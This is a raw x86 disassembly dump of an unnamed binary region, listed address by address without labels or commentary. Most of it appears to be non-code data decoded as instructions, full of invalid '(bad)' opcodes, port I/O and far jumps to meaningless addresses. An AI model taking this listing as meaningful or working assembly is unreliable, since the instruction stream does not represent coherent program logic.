  40d8fe:	push   edi
  40d8ff:	mov    DWORD PTR [ecx-0x75],edx
  40d902:	xor    esp,DWORD PTR [edi+edx*2]
  40d905:	mov    ebx,DWORD PTR [esi+0x3003294]
  40d90b:	mov    ecx,DWORD PTR [ecx-0x74dbdb75]
  40d911:	mov    ecx,DWORD PTR [esp+edx*4]
  40d914:	push   esp
  40d915:	add    BYTE PTR [eax],ah
  40d917:	mov    edx,DWORD PTR [ebp+0x3]
  40d91a:	cmp    edi,DWORD PTR [esi*2+0x24188b4c]
  40d921:	mov    DWORD PTR [ebx+0x33002401],ecx
  40d927:	dec    ecx
  40d928:	add    ebp,DWORD PTR [edx+0xf]
  40d92b:	push   0x4c30ca
  40d930:	adc    BYTE PTR [eax+0x1f],dh
  40d933:	push   0x0
  40d935:	(bad)  
  40d936:	cmp    ecx,DWORD PTR [ecx-0x7474db8b]
  40d93c:	and    al,0x24
  40d93e:	mov    esi,DWORD PTR [ebx]
  40d940:	and    al,0x3
  40d942:	xor    ecx,DWORD PTR [ecx-0x74f7db73]
  40d948:	jb     0x40d96e
  40d94a:	add    bh,bh
  40d94c:	inc    esp
  40d94d:	and    al,0x14
  40d94f:	lea    esi,[ebx]
  40d951:	and    al,0x9c
  40d953:	push   eax
  40d954:	jmp    0x54d99d
  40d959:	(bad)  
  40d95a:	cli    
  40d95b:	and    al,0x85
  40d95d:	(bad)  
  40d95e:	clc    
  40d95f:	and    al,0xa
  40d961:	call   0xffddd298
  40d966:	jmp    0x54d9af
  40d96b:	dec    esp
  40d96c:	aas    
  40d96d:	or     al,0x9c
  40d96f:	(bad)  
  40d970:	cmp    eax,edi
  40d972:	bswap  eax
  40d974:	mov    bh,0x4b
  40d976:	add    BYTE PTR [ebx+ecx*4+0x20],al
  40d97a:	and    al,0x4c
  40d97c:	mov    DWORD PTR [esp],ebx
  40d97f:	(bad)  
  40d980:	mov    eax,edi
  40d982:	or     BYTE PTR [edi-0x76e3dbbc],ch
  40d988:	inc    esp
  40d989:	jmp    0x40d99f
  40d98b:	add    DWORD PTR [edx+esi*1+0x20],0x1075449c
  40d993:	push   0xf8148544
  40d998:	inc    esp
  40d999:	sbb    BYTE PTR [edx+edi*8],dl
  40d99c:	dec    esp
  40d99d:	test   DWORD PTR [eax+edi*8],ebx
  40d9a0:	mov    BYTE PTR [edi],0xc7
  40d9a3:	xor    BYTE PTR [ecx],al
  40d9a5:	pushf  
  40d9a6:	inc    esp
  40d9a7:	jmp    0x40d9c1
  40d9a9:	add    DWORD PTR [eax+0x9c0130],0x44500875
  40d9b3:	jne    0x40d9cd
  40d9b5:	or     DWORD PTR [eax+0x100185],eax
  40d9bb:	or     al,0x0
  40d9bd:	jne    0x40da00
  40d9bf:	call   0xff65d84f
  40d9c4:	mov    eax,DWORD PTR [eax+ebx*8+0xc]
  40d9c8:	add    BYTE PTR [ebx+ecx*4+0xc],al
  40d9cc:	adc    al,0x5e
  40d9ce:	add    al,0xe5
  40d9d0:	add    dl,al
  40d9d2:	add    BYTE PTR [eax],al
  40d9d4:	inc    DWORD PTR [ecx]
  40d9d6:	push   eax
  40d9d7:	cli    
  40d9d8:	add    al,bh
  40d9da:	shl    DWORD PTR [ecx],1
  40d9dc:	inc    esp
  40d9dd:	jmp    0x40d9eb
  40d9df:	xor    DWORD PTR [ebp+esi*2+0x14],eax
  40d9e3:	test   esi,eax
  40d9e5:	cli    
  40d9e6:	(bad)  
  40d9e7:	inc    DWORD PTR [eax+ecx*1+0x24]
  40d9eb:	inc    DWORD PTR [esp+0x1c]
  40d9ef:	and    al,0x74
  40d9f1:	mov    ebx,DWORD PTR [eax]
  40d9f3:	or     al,0x44
  40d9f5:	and    al,0x28
  40d9f7:	and    al,0x8d
  40d9f9:	add    esp,DWORD PTR [esp+esi*2]
  40d9fc:	push   eax
  40d9fd:	and    al,0x74
  40d9ff:	and    al,0x2c
  40da01:	add    esi,DWORD PTR [esp+eax*2+0x24]
  40da05:	ss mov bl,0x7
  40da08:	inc    DWORD PTR [ecx-0x7749775]
  40da0e:	xor    edi,DWORD PTR [esi+0x3b]
  40da11:	mov    ecx,DWORD PTR [ebx+0xf338b5d]
  40da17:	and    al,0x85
  40da19:	pushf  
  40da1a:	pushf  
  40da1b:	clc    
  40da1c:	dec    DWORD PTR [ecx+0x4105bf5f]
  40da22:	add    bl,al
  40da24:	add    eax,0x5c70041
  40da29:	inc    ecx
  40da2a:	add    bl,cl
  40da2c:	add    eax,0x5cf0041
  40da31:	inc    ecx
  40da32:	add    bl,dl
  40da34:	add    eax,0x5d70041
  40da39:	inc    ecx
  40da3a:	add    bl,bl
  40da3c:	add    eax,0xffd40041
  40da41:	in     eax,dx
  40da42:	jp     0x40da33
  40da44:	jp     0x40da1d
  40da46:	(bad)  
  40da47:	jnp    0x40da85
  40da49:	adc    ecx,DWORD PTR [esi-0x27]
  40da4c:	cmp    eax,0xe1815680
  40da51:	add    BYTE PTR [eax],al
  40da53:	and    al,BYTE PTR [edi]
  40da55:	add    BYTE PTR [eax],al
  40da57:	sbb    bl,BYTE PTR [edx+0x1d45e1d5]
  40da5d:	clc    
  40da5e:	loopne 0x40da58
  40da60:	test   eax,0x154861ae
  40da65:	mov    ch,0x4f
  40da67:	and    DWORD PTR [esp+eiz*2-0xef0354],ecx
  40da6e:	and    DWORD PTR [ebp+0x35],edx
  40da71:	dec    ecx
  40da72:	cwde   
  40da73:	jmp    0xd7ec:0x16214bc3
  40da7a:	jae    0x40da89
  40da7c:	add    DWORD PTR [ebp-0x5],0xfffffffb
  40da80:	scas   al,BYTE PTR es:[edi]
  40da81:	adc    eax,0x9f3903b9
  40da86:	jmp    0xd4e9:0xfa9ab611
  40da8d:	jmp    0x4a5ef3e3
  40da92:	ins    DWORD PTR es:[edi],dx
  40da93:	xchg   BYTE PTR [esi],al
  40da95:	scas   eax,DWORD PTR es:[edi]
  40da96:	lods   al,BYTE PTR ds:[esi]
  40da97:	ss sti 
  40da99:	nop
  40da9a:	jmp    FWORD PTR [esi+0x3b4e9f10]
  40daa0:	mov    ds,WORD PTR [edx]
  40daa2:	xchg   BYTE PTR [ebp-0x17],cl
  40daa5:	mov    ebp,0x43f8334
  40daaa:	out    dx,eax
  40daab:	xchg   ebp,eax
  40daac:	mov    bl,0xf8
  40daae:	fsincos 
  40dab0:	aad    0xd0
  40dab2:	xchg   eax,edi
  40dab4:	inc    ebx
  40dab5:	adc    DWORD PTR es:[ebp+0x2f8b7cba],ecx
  40dabc:	cli    
  40dabd:	fucomp st(1)
  40dabf:	jmp    0xf82e:0x48172406
  40dac6:	and    eax,0x1f743a38
  40dacb:	push   0xc
  40dacd:	dec    esp
  40dace:	fisttp DWORD PTR [ebx-0x20c03a98]
  40dad4:	jg     0x40db20
  40dad6:	sub    al,0xfe
  40dad8:	ins    BYTE PTR es:[edi],dx
  40dad9:	mov    WORD PTR [ebx+0x27ecd453],es
  40dadf:	mov    ds:0xfe205954,al
  40dae4:	clc    
  40dae5:	out    dx,eax
  40dae6:	ror    ebx,0x47
  40dae9:	ja     0x40da7f
  40daeb:	repz mov edi,0x7ea7e87a
  40daf1:	in     al,dx
  40daf2:	pop    eax
  40daf3:	mov    WORD PTR [esp+eiz*8-0x6e],cs
  40daf7:	jae    0x40da91
  40daf9:	and    ebp,DWORD PTR [esi+0x4c]
  40dafc:	fcomp  DWORD PTR [esi+0x35]
  40daff:	add    ebx,edx
  40db01:	and    al,0x52
  40db03:	adc    eax,0x22
  40db06:	fadd   st(4),st
  40db08:	adc    ecx,DWORD PTR [esi+0x62]
  40db0b:	das    
  40db0c:	imul   edi,DWORD PTR [esi+0x48],0x22
  40db10:	shl    BYTE PTR [edx+0xc857065],1
  40db16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db17:	xchg   edx,eax
  40db18:	push   ebp
  40db19:	(bad)  
  40db1a:	push   ecx
  40db1b:	push   ebx
  40db1c:	cmp    eax,0xf55f9983
  40db21:	cmp    ah,BYTE PTR [ebx+0x62b53c60]
  40db27:	mov    cl,BYTE PTR [ebx]
  40db29:	jno    0x40daec
  40db2b:	xor    cl,BYTE PTR [edx-0x6721547c]
  40db31:	jnp    0x40db07
  40db33:	mov    ecx,0x9b2d0647
  40db38:	cdq    
  40db39:	inc    edi
  40db3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db3b:	outs   dx,DWORD PTR ds:[esi]
  40db3c:	dec    ebp
  40db3d:	fucomi st,st(2)
  40db3f:	std    
  40db40:	test   al,0x34
  40db42:	jmp    0x9c006216
  40db47:	push   ebp
  40db48:	or     DWORD PTR [edx],ecx
  40db4a:	pop    ss
  40db4b:	fld    DWORD PTR [ecx+0x17511cde]
  40db51:	fidiv  WORD PTR [edi-0x1e]
  40db54:	stos   BYTE PTR es:[edi],al
  40db55:	ins    DWORD PTR es:[edi],dx
  40db56:	ret    
  40db57:	dec    eax
  40db58:	int3   
  40db59:	inc    esp
  40db5a:	outs   dx,DWORD PTR ds:[esi]
  40db5b:	and    BYTE PTR [ecx],cl
  40db5d:	and    eax,0x162c0f29
  40db62:	inc    ebp
  40db63:	std    
  40db64:	and    eax,0x9ac6c13a
  40db69:	or     bh,BYTE PTR [eax-0x417471be]
  40db6f:	dec    eax
  40db70:	(bad)  
  40db71:	push   ds
  40db72:	cmp    BYTE PTR [eax+esi*8-0x221d127c],dl
  40db79:	(bad)  
  40db7a:	cmp    al,0x9d
  40db7c:	mov    BYTE PTR [eax],al
  40db7e:	scas   al,BYTE PTR es:[edi]
  40db7f:	sub    BYTE PTR [ebx-0x32],al
  40db82:	in     eax,0x9
  40db84:	lds    esi,FWORD PTR [edx]
  40db86:	imul   ebx,DWORD PTR [ecx+eax*1],0x48
  40db8a:	fdivr  QWORD PTR [eax-0x12c01ef1]
  40db90:	repz test eax,0x65bc7d1c
  40db96:	jne    0x40dbca
  40db98:	xchg   esp,eax
  40db99:	xchg   ebp,eax
  40db9a:	clc    
  40db9b:	xchg   edi,eax
  40db9c:	es xchg esi,eax
  40db9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db9f:	mov    gs,WORD PTR [edx+0x29e769ec]
  40dba5:	mov    ds:0x8163e6f7,al
  40dbaa:	int3   
  40dbab:	in     eax,dx
  40dbac:	sti    
  40dbad:	adc    al,BYTE PTR [ebx+0x10727eaa]
  40dbb3:	adc    dh,0x8a
  40dbb6:	xor    ecx,DWORD PTR [edi+0x4f3dc664]
  40dbbc:	in     al,dx
  40dbbd:	mov    ch,0x13
  40dbbf:	xchg   ebp,eax
  40dbc0:	fnstsw WORD PTR [edx]
  40dbc2:	push   ss
  40dbc3:	loope  0x40dbc9
  40dbc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbc6:	xor    BYTE PTR [edi],cl
  40dbc8:	jae    0x40dba2
  40dbca:	xchg   ebx,eax
  40dbcb:	sti    
  40dbcc:	dec    bl
  40dbce:	xchg   ebp,eax
  40dbcf:	push   es
  40dbd0:	hlt    
  40dbd1:	cmp    ebx,DWORD PTR [ebp-0x6a]
  40dbd4:	and    DWORD PTR ds:0x5e827b73,esi
  40dbda:	gs sbb ebx,eax
  40dbdd:	scas   eax,DWORD PTR es:[edi]
  40dbde:	xor    DWORD PTR [ebx],edi
  40dbe0:	xor    cl,BYTE PTR [edx-0x76]
  40dbe3:	arpl   WORD PTR [esi-0x2d],dx
  40dbe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbe7:	inc    ebx
  40dbe8:	outs   dx,BYTE PTR ds:[esi]
  40dbe9:	or     BYTE PTR [ebp-0x6af5c26f],ch
  40dbef:	lock mov ebp,DWORD PTR [esi-0x69b248b2]
  40dbf6:	push   es
  40dbf7:	sub    DWORD PTR [edx+0x0],0x40352670
  40dbfe:	or     BYTE PTR ds:0x35258fb5,dh
  40dc04:	inc    eax
  40dc05:	mov    gs,WORD PTR [ebp+0x2b]
  40dc08:	sub    ebp,ebx
  40dc0a:	and    al,0x4d
  40dc0c:	sbb    cl,BYTE PTR [ebx+0x54]
  40dc0f:	jg     0x40dc75
  40dc11:	fs mov bl,0x8e
  40dc14:	pop    esi
  40dc15:	xchg   ebp,eax
  40dc16:	pushf  
  40dc17:	xor    esp,DWORD PTR [ebx+0x44]
  40dc1a:	stc    
  40dc1b:	sbb    al,0x1a
  40dc1d:	jmp    0x40dc23
  40dc1f:	addr16 ret 
  40dc21:	mov    dh,0xc9
  40dc23:	push   DWORD PTR [esi+0x6b]
  40dc26:	call   0xe5c9:0xb77a7b92
  40dc2d:	call   0x6cca:0xd7e22ec5
  40dc34:	or     ah,BYTE PTR [esi-0x4b9cbbbd]
  40dc3a:	xor    eax,DWORD PTR [ebx-0x13]
  40dc3d:	xchg   esi,eax
  40dc3e:	push   ss
  40dc3f:	adc    al,BYTE PTR [ebx+eiz*8+0x3fe98fdd]
  40dc46:	jns    0x40dc0d
  40dc48:	push   ecx
  40dc49:	push   edx
  40dc4a:	xchg   esi,eax
  40dc4b:	jge    0x40dc44
  40dc4d:	inc    ebp
  40dc4e:	das    
  40dc4f:	mov    ebx,0x8dbd828a
  40dc54:	mov    dh,0xbc
  40dc56:	pop    ecx
  40dc57:	retf   0x5fc
  40dc5a:	fyl2xp1 
  40dc5c:	daa    
  40dc5d:	sahf   
  40dc5e:	shl    DWORD PTR [ebp-0x1f],0xb5
  40dc62:	stos   DWORD PTR es:[edi],eax
  40dc63:	dec    edx
  40dc64:	mov    bh,0x92
  40dc66:	cmc    
  40dc67:	in     al,dx
  40dc68:	pop    ebx
  40dc69:	leave  
  40dc6a:	jnp    0x40dbf1
  40dc6c:	inc    esi
  40dc6d:	jg     0x40dc44
  40dc6f:	sbb    al,0x3b
  40dc71:	call   0xb6aae5c9
  40dc76:	cs mov ?,ebx
  40dc79:	mov    al,ds:0x7ebb1491
  40dc7e:	rcr    BYTE PTR [ebx-0x3cedc9df],0x54
  40dc85:	iret   
  40dc86:	sahf   
  40dc87:	scas   eax,DWORD PTR es:[edi]
  40dc88:	push   esi
  40dc89:	xchg   ecx,eax
  40dc8a:	clc    
  40dc8b:	nop
  40dc8c:	in     al,dx
  40dc8d:	mov    ecx,0xdc8efe92
  40dc92:	mov    BYTE PTR [eax],0x33
  40dc95:	ret    0xfb82
  40dc98:	fmul   DWORD PTR [esi-0x56e27213]
  40dc9e:	pop    es
  40dc9f:	fdiv   QWORD PTR [eax-0x17]
  40dca2:	lock sar BYTE PTR [edx],1
  40dca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dca6:	push   esi
  40dca7:	or     eax,0x70fd3ffb
  40dcac:	div    BYTE PTR [esi-0x16b9fe15]
  40dcb2:	push   ecx
  40dcb3:	inc    ebx
  40dcb4:	inc    ecx
  40dcb5:	dec    eax
  40dcb6:	xchg   esp,eax
  40dcb7:	out    dx,eax
  40dcb8:	aam    0x65
  40dcba:	xor    bl,BYTE PTR [ebx+0x3347ba1c]
  40dcc0:	fs mov ebp,0xd3f9822
  40dcc6:	rcr    DWORD PTR ds:0x8d03cf00,1
  40dccc:	test   BYTE PTR [edx],dh
  40dcce:	out    0x62,al
  40dcd0:	mov    esi,0x2534320d
  40dcd5:	lds    edi,FWORD PTR [ecx+edx*8+0x31]
  40dcd9:	and    BYTE PTR [ebx+0x7065b4a4],0x51
  40dce0:	pop    es
  40dce1:	lods   eax,DWORD PTR ds:[esi]
  40dce2:	dec    ebx
  40dce3:	sub    eax,0xa172a471
  40dce8:	fs es out dx,al
  40dceb:	js     0x40dca6
  40dced:	or     al,0xe4
  40dcef:	xor    eax,0x43ae51f
  40dcf4:	in     al,dx
  40dcf5:	pop    eax
  40dcf6:	jl     0x40dd11
  40dcf8:	sub    edi,edx
  40dcfa:	add    al,BYTE PTR [edi]
  40dcfc:	push   eax
  40dcfd:	iret   
  40dcfe:	mov    ebx,0xa724e0de
  40dd03:	call   0x7c61:0xbf9cf824
  40dd0a:	jge    0x40dcbf
  40dd0c:	mov    ecx,0x5914742b
  40dd11:	test   eax,0x93a04b15
  40dd16:	pop    edx
  40dd17:	sbb    bh,dh
  40dd19:	mov    cl,0xd0
  40dd1b:	pop    esi
  40dd1c:	cmc    
  40dd1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd1e:	xchg   ebp,eax
  40dd1f:	retf   
  40dd20:	push   ss
  40dd21:	dec    ebp
  40dd22:	fstp   QWORD PTR [eax-0x4a9a8ff0]
  40dd28:	icebp  
  40dd29:	xor    ebx,DWORD PTR [esi+ebp*1]
  40dd2c:	xchg   esi,eax
  40dd2d:	sub    BYTE PTR [edx-0x7ab7904e],dh
  40dd33:	sub    eax,0x265ff17f
  40dd38:	xor    DWORD PTR [edx-0x6cca9b32],ebx
  40dd3e:	xor    DWORD PTR [ebp+esi*8-0x10b46276],esi
  40dd45:	xor    eax,0xd9547b1e
  40dd4a:	cmp    ch,dh
  40dd4c:	sbb    ah,BYTE PTR [edx]
  40dd4e:	in     al,0x9b
  40dd50:	popf   
  40dd51:	mov    ebx,0x7e1b7957
  40dd56:	push   es
  40dd57:	aam    0x6a
  40dd59:	hlt    
  40dd5a:	inc    esi
  40dd5b:	mov    ebp,0x124c196d
  40dd60:	repz pop es
  40dd62:	imul   ebx,DWORD PTR [ecx],0x5e8cfba
  40dd68:	push   esp
  40dd69:	je     0x40dd2d
  40dd6b:	sub    al,0x5a
  40dd6d:	jb     0x40dd9f
  40dd6f:	aas    
  40dd70:	ins    BYTE PTR es:[edi],dx
  40dd71:	pop    ds
  40dd72:	push   edx
  40dd73:	cdq    
  40dd74:	fwait
  40dd75:	rcl    BYTE PTR [ebp+0x2a],cl
  40dd78:	sub    ah,ch
  40dd7a:	aas    
  40dd7b:	stos   DWORD PTR es:[edi],eax
  40dd7c:	mov    ch,0x69
  40dd7e:	cli    
  40dd7f:	out    dx,eax
  40dd80:	shl    BYTE PTR [edx+0x208ffb78],0xfc
  40dd87:	in     eax,dx
  40dd88:	retf   
  40dd89:	pop    edx
  40dd8a:	xlat   BYTE PTR ds:[ebx]
  40dd8b:	(bad)  
  40dd8d:	pop    ebx
  40dd8e:	mov    dh,al
  40dd90:	or     DWORD PTR [esi+0x3beaa008],ecx
  40dd96:	dec    esi
  40dd97:	test   al,0xd4
  40dd99:	xor    DWORD PTR [ebp+edx*8-0x79],ebx
  40dd9d:	adc    DWORD PTR [esi],ebp
  40dd9f:	push   edx
  40dda0:	add    DWORD PTR gs:[eax-0x5f],esp
  40dda4:	stos   BYTE PTR es:[edi],al
  40dda5:	or     BYTE PTR [esi],dl
  40dda7:	rcr    DWORD PTR [ebp+edx*8+0x7eff4cca],0xee
  40ddaf:	or     BYTE PTR [ebp+0x49c9b1eb],dh
  40ddb5:	rcr    BYTE PTR [ebx-0x7],0x79
  40ddb9:	lahf   
  40ddba:	fldenv [esi+0x36d7207c]
  40ddc0:	jp     0x40ddfc
  40ddc2:	jo     0x40ddb2
  40ddc4:	add    DWORD PTR ds:[bp+di+0x35],esi
  40ddc9:	out    0x62,al
  40ddcb:	xor    al,0x1a
  40ddcd:	adc    DWORD PTR [esi],ebp
  40ddcf:	xrelease mov BYTE PTR [ecx],dh
  40ddd2:	cmp    esp,ecx
  40ddd4:	(bad)  
  40ddd5:	dec    ecx
  40ddd6:	imul   DWORD PTR [edx]
  40ddd8:	or     eax,DWORD PTR [ebx-0x64a4e273]
  40ddde:	sar    BYTE PTR [edi-0x26],1
  40dde1:	cdq    
  40dde2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dde3:	mov    edx,0xab7db5fd
  40dde8:	pop    eax
  40dde9:	pop    ds
  40ddea:	xlat   BYTE PTR ds:[ebx]
  40ddeb:	xchg   DWORD PTR [esp+ebx*2-0x32],esp
  40ddef:	jmp    0xb629d05c
  40ddf4:	pusha  
  40ddf5:	test   eax,0x24f2048e
  40ddfa:	inc    eax
  40ddfb:	call   0x5e74:0x207eb50
  40de02:	xchg   esi,eax
  40de03:	sbb    ebx,ecx
  40de05:	fucomp st(2)
  40de07:	mov    edx,0x7d8eef89
  40de0c:	inc    edi
  40de0d:	aas    
  40de0e:	(bad)  
  40de0f:	mov    al,ds:0x9108ff7
  40de14:	mov    ds:0x2f88df68,eax
  40de19:	xchg   ebx,eax
  40de1a:	sahf   
  40de1b:	inc    ebp
  40de1c:	jg     0x40dda2
  40de1e:	stos   DWORD PTR es:[edi],eax
  40de1f:	push   ds
  40de20:	push   0x8472f63a
  40de25:	mov    bl,0x98
  40de27:	scas   al,BYTE PTR es:[edi]
  40de28:	mov    esp,DWORD PTR [edx+0x27]
  40de2b:	test   al,0xd7
  40de2d:	mov    eax,0x523c5b9d
  40de32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de33:	push   esi
  40de34:	jle    0x40de59
  40de36:	aas    
  40de37:	retf   
  40de38:	test   edi,esp
  40de3a:	fistp  DWORD PTR [esp+ebp*8]
  40de3d:	inc    ebx
  40de3e:	jle    0x40de14
  40de40:	test   eax,0x2b046d7f
  40de45:	xor    ch,BYTE PTR [eax]
  40de47:	sbb    DWORD PTR [edx],edx
  40de49:	and    DWORD PTR [ecx],esp
  40de4b:	add    esp,0xffffffb0
  40de4e:	sub    eax,0x2afe15fe
  40de53:	jae    0x40de66
  40de55:	(bad)  
  40de56:	cs push 0x4fa34ff6
  40de5c:	xor    eax,0x43b7a784
  40de61:	stos   DWORD PTR es:[edi],eax
  40de62:	(bad)  
  40de63:	cmc    
  40de64:	in     eax,dx
  40de65:	add    eax,0x7d3aa2a4
  40de6a:	adc    DWORD PTR [edx+0x22],ebp
  40de6d:	xlat   BYTE PTR ds:[ebx]
  40de6e:	push   0xffffffc2
  40de70:	cmp    DWORD PTR [ebx-0x465dfb22],edx
  40de76:	inc    esp
  40de77:	add    al,0x39
  40de79:	sbb    esi,DWORD PTR [edi-0x6f]
  40de7c:	adc    al,0x72
  40de7e:	cmp    eax,0xa9308e6c
  40de83:	imul   edi,DWORD PTR [esi-0x2a],0x20
  40de87:	stos   BYTE PTR es:[edi],al
  40de88:	shl    DWORD PTR [ebx+0x40],cl
  40de8b:	shl    BYTE PTR [eax+0x6f],1
  40de8e:	in     al,dx
  40de8f:	and    DWORD PTR [edx-0xcdca0d2],esp
  40de95:	into   
  40de96:	adc    al,0x57
  40de98:	inc    edi
  40de99:	add    eax,0x4860264e
  40de9e:	ins    DWORD PTR es:[edi],dx
  40de9f:	inc    edx
  40dea0:	pop    esi
  40dea1:	jg     0x40df21
  40dea3:	lds    ebx,FWORD PTR [edi+0x11]
  40dea6:	inc    esi
  40dea7:	outs   dx,DWORD PTR ds:[esi]
  40dea8:	dec    esp
  40dea9:	mov    ebx,edi
  40deab:	pop    es
  40deac:	or     edi,ecx
  40deae:	hlt    
  40deaf:	fwait
  40deb0:	int3   
  40deb1:	popf   
  40deb2:	daa    
  40deb3:	xchg   esp,eax
  40deb4:	and    BYTE PTR [ebp+0x39dc550d],0x4d
  40debb:	sbb    ch,BYTE PTR [edi]
  40debd:	xor    esi,DWORD PTR [edx]
  40debf:	fisttp DWORD PTR [eax]
  40dec1:	outs   dx,BYTE PTR ds:[esi]
  40dec2:	js     0x40df42
  40dec4:	mov    esi,0xd3428197
  40dec9:	aas    
  40deca:	out    dx,eax
  40decb:	daa    
  40decc:	outs   dx,DWORD PTR ds:[esi]
  40decd:	mov    bh,0x44
  40decf:	and    esp,DWORD PTR [ebp-0x20fe71e7]
  40ded5:	dec    ebx
  40ded6:	mov    gs,esp
  40ded8:	mov    ecx,edi
  40deda:	add    BYTE PTR ds:0x53df0688,0x3e
  40dee1:	les    eax,FWORD PTR [ebx-0x47]
  40dee4:	jbe    0x40df65
  40dee6:	fild   DWORD PTR ds:0xfcbd4027
  40deec:	push   edx
  40deed:	dec    ebx
  40deee:	loop   0x40de8c
  40def0:	jle    0x40df39
  40def2:	hlt    
  40def3:	adc    DWORD PTR [ebp+0x75],esp
  40def6:	pop    eax
  40def7:	jle    0x40deb3
  40def9:	or     cl,BYTE PTR [ecx+edi*8-0x50]
  40defd:	imul   ebp
  40deff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df00:	aad    0x2
  40df02:	call   0xc2c1:0xffc53f11
  40df09:	in     al,0x6e
  40df0b:	or     edi,DWORD PTR [eax+eax*2+0x7f706ab2]
  40df12:	test   eax,0x287e681c
  40df17:	shl    BYTE PTR [eax+0x67a8d7c5],0xae
  40df1e:	and    dh,bh
  40df20:	ret    0x33b5
  40df23:	xor    ch,BYTE PTR [esi+0xc]
  40df26:	call   DWORD PTR [ecx+eax*4-0x38]
  40df2a:	shl    DWORD PTR [esp+ebx*1],cl
  40df2d:	sti    
  40df2e:	mov    bh,0x36
  40df30:	pop    DWORD PTR ds:0x27fff8c2
  40df36:	test   al,0x56
  40df38:	add    esi,edx
  40df3a:	aam    0x85
  40df3c:	jmp    0xe8e4:0x40e120d8
  40df43:	mov    al,0x2a
  40df45:	jne    0x40df06
  40df47:	pop    eax
  40df48:	cmp    DWORD PTR [edx-0x3cb5cd95],ebp
  40df4e:	pop    edi
  40df4f:	into   
  40df50:	add    eax,0xa8607d1b
  40df55:	push   ss
  40df56:	fstp   DWORD PTR [eax]
  40df58:	shr    edi,0x30
  40df5b:	pop    esi
  40df5c:	iret   
  40df5d:	cmc    
  40df5e:	fstp   st(7)
  40df60:	cdq    
  40df61:	pushf  
  40df62:	or     BYTE PTR [edx+0x62],0x49
  40df66:	jbe    0x603d25d3
  40df6c:	cmc    
  40df6d:	loope  0x40dfcb
  40df6f:	cmp    ebx,ebp
  40df71:	jbe    0x40dfda
  40df73:	cmp    BYTE PTR [edi+0x33],0xbb
  40df77:	jns    0x40dfb9
  40df79:	push   ecx
  40df7a:	aaa    
  40df7b:	rcl    BYTE PTR [ecx],cl
  40df7d:	imul   esp,DWORD PTR [edx],0xdadc4b15
  40df83:	xor    al,0x56
  40df85:	push   edi
  40df86:	pusha  
  40df87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df88:	cmp    bl,BYTE PTR [esi]
  40df8a:	cwde   
  40df8b:	repz mov dh,0xe3
  40df8e:	inc    edx
  40df8f:	idiv   BYTE PTR [edi+0x55]
  40df92:	sbb    al,0x4c
  40df94:	xchg   ebp,eax
  40df95:	fdiv   DWORD PTR ss:[ecx]
  40df98:	inc    ebp
  40df99:	ret    
  40df9a:	or     DWORD PTR [edi+ecx*8-0x59],esi
  40df9e:	push   esi
  40df9f:	inc    edx
  40dfa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfa1:	fxch   st(3)
  40dfa3:	js     0x40dfc2
  40dfa5:	in     eax,0x8f
  40dfa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfa8:	cmovge edx,DWORD PTR [edi+0x21a3a857]
  40dfaf:	(bad)  
  40dfb0:	and    ebx,edi
  40dfb2:	xlat   BYTE PTR ds:[ebx]
  40dfb3:	and    ch,bh
  40dfb5:	push   0xfa54bd2
  40dfba:	or     DWORD PTR [edi+eax*4+0x6a],ebx
  40dfbe:	lds    edi,FWORD PTR [eax-0x5c]
  40dfc1:	or     dl,BYTE PTR [ebx]
  40dfc3:	leave  
  40dfc4:	pushf  
  40dfc5:	gs inc ebx
  40dfc7:	sub    eax,0x98dc742
  40dfcc:	mov    WORD PTR [esi+0x13314e5b],ss
  40dfd2:	std    
  40dfd3:	hlt    
  40dfd4:	push   ecx
  40dfd5:	push   ss
  40dfd6:	xchg   edx,eax
  40dfd7:	mov    bh,0x4f
  40dfd9:	cmp    DWORD PTR [ecx+ebp*1],0x490e1317
  40dfe0:	(bad)  
  40dfe1:	fbld   TBYTE PTR [ecx-0x6]
  40dfe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfe5:	xchg   bx,ax
  40dfe7:	sub    al,0xac
  40dfe9:	mov    al,BYTE PTR [ebx]
  40dfeb:	jge    0x40dfdd
  40dfed:	adc    DWORD PTR [edi-0x454ff33a],0xa4b2e527
  40dff7:	jns    0x40e052
  40dff9:	or     DWORD PTR [eax+0x5e212400],edx
  40dfff:	sbb    al,0xb9
  40e001:	rcl    BYTE PTR ds:0xb658cb9e,cl
  40e007:	mov    ds:0x93886ccc,eax
  40e00c:	xchg   DWORD PTR [ebp+0x38],ebp
  40e00f:	add    al,0xc7
  40e011:	xchg   ebp,eax
  40e012:	or     eax,0x3ac73d34
  40e017:	sbb    bh,dh
  40e019:	xchg   edx,eax
  40e01a:	out    0x98,al
  40e01c:	pop    esp
  40e01d:	mov    gs,WORD PTR [eax+0x4949ebc4]
  40e023:	jl     0x40e008
  40e025:	(bad)  
  40e026:	ins    BYTE PTR es:[edi],dx
  40e027:	cmp    eax,0x217aae19
  40e02c:	imul   BYTE PTR [eax-0x5b]
  40e02f:	mov    ds:0x49825208,al
  40e034:	add    eax,0xab15c234
  40e039:	addr16 aam 0x31
  40e03c:	test   BYTE PTR [edi+0x4f991363],al
  40e042:	push   es
  40e043:	ins    BYTE PTR es:[edi],dx
  40e044:	adc    BYTE PTR [ebp+0x4],al
  40e047:	pop    es
  40e048:	sbb    dl,BYTE PTR [esi+0x7d12e588]
  40e04e:	pop    ss
  40e04f:	test   DWORD PTR [edx-0x48fafa5f],edx
  40e055:	rol    ebp,1
  40e057:	or     eax,ebp
  40e059:	rcl    DWORD PTR [ebp+edx*4+0x32],cl
  40e05d:	add    eax,0x2a421ed6
  40e062:	sbb    al,0x6b
  40e064:	sar    DWORD PTR [ebx+edi*1+0x68417268],0xe0
  40e06c:	and    esi,ebp
  40e06e:	sbb    eax,0xf9724fc2
  40e073:	add    ch,BYTE PTR [ecx+0x39a80f34]
